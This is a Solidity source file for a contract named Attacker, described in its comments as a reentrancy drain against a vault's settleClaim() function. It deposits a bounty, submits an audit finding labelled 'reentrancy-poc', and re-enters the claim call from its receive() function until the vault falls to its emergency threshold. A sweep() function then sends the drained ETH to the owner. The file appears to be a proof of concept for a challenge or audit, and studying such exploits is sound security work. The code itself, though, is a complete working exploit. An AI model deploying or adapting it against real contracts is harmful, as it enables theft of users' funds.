// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IChainVault {
    function depositBounty(bytes32 _bountyId) external payable;
    function submitAuditFinding(bytes32 _bountyId, string calldata _findingRef) external;
    function settleClaim() external;
    function getVaultStatus()
        external
        view
        returns (
            uint256 balance,
            uint256 threshold,
            bool isEmergency,
            bool solved,
            uint256 deposited,
            uint256 claimed,
            address registry
        );
}

/// @title Attacker — reentrancy drain for ChainVault.settleClaim()
/// @notice Deployed by the team's own (owner) wallet. The owner registers
///         this contract's address as an auditor on AuditorRegistry, then
///         calls run() which deposits a bounty, submits a finding, and
///         repeatedly re-enters settleClaim() from receive() until the
///         vault balance drops to/below emergencyThreshold.
contract Attacker {
    IChainVault public vault;
    address public owner;
    uint256 public claimAmount;   // expected per-call payout, set in run()
    uint256 public threshold;     // emergencyThreshold, cached in run()
    bool public draining;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _vault) {
        vault = IChainVault(_vault);
        owner = msg.sender;
    }

    /// @notice Kick off the whole chain: deposit -> submit finding -> settle (reenter).
    /// @param _bountyId   arbitrary unique bounty id
    /// @param _depositAmt amount of ETH to deposit as the bounty (forwarded from caller)
    function run(bytes32 _bountyId, uint256 _depositAmt) external payable onlyOwner {
        require(msg.value >= _depositAmt, "send enough ETH to cover deposit");

        ( , uint256 _threshold, , , , , ) = vault.getVaultStatus();
        threshold = _threshold;
        claimAmount = _depositAmt > 1 ether ? 1 ether : _depositAmt;

        vault.depositBounty{value: _depositAmt}(_bountyId);
        vault.submitAuditFinding(_bountyId, "reentrancy-poc");

        draining = true;
        vault.settleClaim(); // first call; receive() will re-enter
        draining = false;
    }

    receive() external payable {
        if (draining && address(vault).balance >= claimAmount + threshold) {
            vault.settleClaim();
        }
    }

    /// @notice Sweep any ETH this contract collected back to the owner wallet.
    function sweep() external onlyOwner {
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
